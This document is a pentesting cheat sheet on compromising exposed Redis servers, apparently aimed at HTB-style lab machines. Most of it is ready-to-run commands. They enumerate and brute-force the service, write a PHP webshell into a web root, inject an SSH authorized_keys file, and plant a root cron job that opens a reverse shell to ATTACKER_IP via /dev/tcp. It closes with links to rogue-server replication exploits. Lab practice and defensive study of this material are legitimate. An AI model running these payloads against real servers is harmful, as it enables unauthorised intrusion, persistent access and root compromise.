**Redis** is an in-memory key-value database commonly used for caching, session storage, message queues, and fast application data processing. It is extremely popular in web infrastructures because of its speed and simplicity.

From a pentesting perspective, Redis becomes dangerous when:

- authentication is disabled
    
- the service is exposed externally
    
- dangerous commands are enabled
    
- the Redis process runs as root
    
- filesystem write access is possible
    

Default Redis port:

```bash
6379/tcp
```

Redis usually has no encryption and often trusts internal networks by default.

---

## Service Detection

Basic version detection:

```bash
nmap -sV -p 6379 <target>
```

Useful NSE scripts:

```bash
nmap -p 6379 --script redis-info <target>
```

Brute force authentication:

```bash
nmap -p 6379 --script redis-brute <target>
```

Banner grabbing:

```bash
nc <target> 6379
```

Simple ping:

```bash
redis-cli -h <target> ping
```

Expected response:

```text
PONG
```

---

## Installing redis-cli

On Debian-based systems such as Kali:

```bash
sudo apt update
sudo apt install redis-tools
```

Check installation:

```bash
redis-cli --version
```

---

## Connecting to Redis

Unauthenticated access:

```bash
redis-cli -h <target>
```

Authenticated access:

```bash
redis-cli -h <target> -a '<password>'
```

Specify custom port:

```bash
redis-cli -h <target> -p 6380
```

---

## Basic Enumeration

Retrieve server information:

```bash
INFO
```

Interesting sections:

- redis version
    
- operating system
    
- connected clients
    
- persistence settings
    
- master/slave configuration
    
- filesystem paths
    

Retrieve configuration:

```bash
CONFIG GET *
```

List databases:

```bash
INFO keyspace
```

Select database:

```bash
SELECT 0
```

List keys:

```bash
KEYS *
```

Safer alternative on large databases:

```bash
SCAN 0
```

Retrieve value:

```bash
GET keyname
```

Dump all data:

```bash
redis-cli --rdb dump.rdb
```

---

## Authentication Misconfigurations

Many Redis servers are deployed without authentication.

Check whether authentication is enabled:

```bash
CONFIG GET requirepass
```

If empty:

```text
1) "requirepass"
2) ""
```

then the server allows unauthenticated access.

This is one of the most common Redis misconfigurations.

---
## Brute Force Attack

A brute-force attack involves trying many passwords or usernames to find the right one for accessing a system. Tools like Hydra are designed for cracking into networks and can be used on services like Redis.

#### Using Hydra

```
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] redis://target.com
```

---

## Dangerous Redis Capabilities

Redis can:

- write files to disk
    
- modify directories
    
- create SSH authorized_keys
    
- overwrite cron jobs
    
- act as a replication slave
    
- load modules
    

If the process runs as root, impact becomes critical.

Check running user:

```bash
INFO server
```

Sometimes the process owner appears in startup paths or logs.

---

## Webshell Write

If a web root is writable:

```bash
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
```

Inject PHP payload:

```bash
set shell "<?php system($_GET['cmd']); ?>"
SAVE
```

Execute:

```text
http://target/shell.php?cmd=id
```

---

## SSH Authorized Keys Injection

If Redis runs with sufficient privileges and can write into a user's home directory, SSH access may be possible.

Generate SSH key:

```bash
ssh-keygen -t rsa
```

Prepare payload:

```bash
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > redis.txt
```

Inject key into Redis:

```bash
cat redis.txt | redis-cli -h <target> -x set crackit
```

Change Redis directory:

```bash
CONFIG SET dir /home/user/.ssh
```

Set filename:

```bash
CONFIG SET dbfilename authorized_keys
```

Write file:

```bash
SAVE
```

Then connect:

```bash
ssh -i id_rsa user@target
```

This is one of the most common Redis exploitation techniques in HTB-style machines.

---

## Cron Job Injection

If Redis runs as root, cron jobs may be writable.

Payload:

```bash
echo -e "\n* * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n" > cron.txt
```

Inject:

```bash
cat cron.txt | redis-cli -h <target> -x set cron
```

Set cron directory:

```bash
CONFIG SET dir /var/spool/cron/crontabs
```

Set filename:

```bash
CONFIG SET dbfilename root
```

Save:

```bash
SAVE
```

Listener:

```bash
nc -lvnp 4444
```

This only works if:

- Redis runs as root
    
- cron permissions allow write access
    
- outbound traffic is allowed
    

---

## Redis Replication Abuse

Redis supports master/slave replication.

This can be abused by forcing a Redis instance to sync with a malicious server, which can be used to deliver payloads or trigger module loading behavior depending on configuration.

GitHub PoCs / references:

- [https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
    
- [https://github.com/Ridter/redis-rce](https://github.com/Ridter/redis-rce)
    
- [https://github.com/vulhub/redis-rogue-getshell](https://github.com/vulhub/redis-rogue-getshell)
    
